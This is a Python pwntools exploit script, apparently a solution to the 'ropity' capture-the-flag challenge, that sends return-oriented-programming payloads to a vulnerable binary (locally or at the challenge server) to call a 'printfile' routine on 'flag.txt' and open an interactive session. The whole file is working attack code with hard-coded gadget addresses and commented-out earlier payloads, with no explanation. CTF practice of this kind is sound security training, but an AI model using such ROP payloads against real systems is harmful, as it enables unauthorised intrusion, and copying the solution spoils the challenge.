from pwn import *
from icecream import ic

elf = exe = ELF("./vuln")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("ropity.chal.imaginaryctf.org", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x0000000000401155
b *0x000000000040115b
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

# gadg = 0x0000000000401192

# payload = b'flag.txt'
# payload += b'\x00'*8
# payload += p64(0x401152)
# payload += p64(elf.sym['printfile'])

# payload = p64(elf.sym['printfile'])
# payload = payload.ljust(16, b'a')
# payload += p64(gadg)

payload = p64(0)
payload += p64(0x0000000000404020)
# payload += p64(0x000000000040101a)
payload += p64(0x0000000000401142)
payload += p64(elf.sym['main'])
sl(payload)

payload2 = p64(elf.sym['printfile'])
payload2 += p64(0x0000000000404038)
payload2 += p64(elf.sym['main']+12)
payload2 += b'flag.txt\x00'
sl(payload2)


sl(b'a')
io.interactive()
